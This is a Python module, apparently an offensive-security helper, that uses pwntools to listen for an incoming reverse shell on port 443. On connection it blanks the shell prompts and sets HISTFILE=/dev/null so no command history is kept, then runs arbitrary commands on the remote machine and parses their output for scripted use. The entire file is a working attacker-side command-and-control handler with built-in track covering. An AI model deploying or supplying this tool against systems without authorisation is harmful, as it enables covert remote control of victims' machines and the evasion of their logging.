import asyncio
from typing import Self

from pwn import context, listen

__all__ = [
    "ReverseShell",
]


class ReverseShell:
    MARK = "____DONE____"  # logical marker

    def __init__(self, port=443):

        context.log_level = "warn"
        self.io = listen(port)

    def accept(self, timeout=30) -> Self:
        self.io.wait_for_connection()
        # kill prompt + history noise, then sync on a first marker (drains the banner)
        self.io.sendline(
            b"export PS1='' PS2='' HISTFILE=/dev/null; " b"echo " + self._typed()
        )
        self.io.recvuntil(self.MARK.encode(), timeout=timeout, drop=True)  # type: ignore
        return self

    def _typed(self) -> bytes:
        # split so the sent bytes don't literally contain MARK
        h = self.MARK[:4]
        t = self.MARK[4:]
        return f"{h}''{t}".encode()

    @staticmethod
    def _split(mark) -> bytes:  # "BEGmark" -> b"BEG''mark" (prints: BEGmark)
        return f"{mark[:3]}''{mark[3:]}".encode()

    def run(self, cmd, timeout=15) -> str:
        beg, end = "BEGoutput", "ENDoutput"
        self.io.sendline(
            b"echo "
            + self._split(beg)
            + b"; "
            + cmd.encode()
            + b"; echo "
            + self._split(end)
        )
        self.io.recvuntil(beg.encode(), timeout=timeout)  # type: ignore
        out = self.io.recvuntil(end.encode(), timeout=timeout, drop=True)  # type: ignore
        return out.decode(errors="replace").strip()

    def close(self):
        self.io.close()

    # async glue
    async def aaccept(self, timeout=30) -> Self:
        return await asyncio.to_thread(self.accept, timeout)

    async def arun(self, cmd, timeout=15) -> str:
        return await asyncio.to_thread(self.run, cmd, timeout)
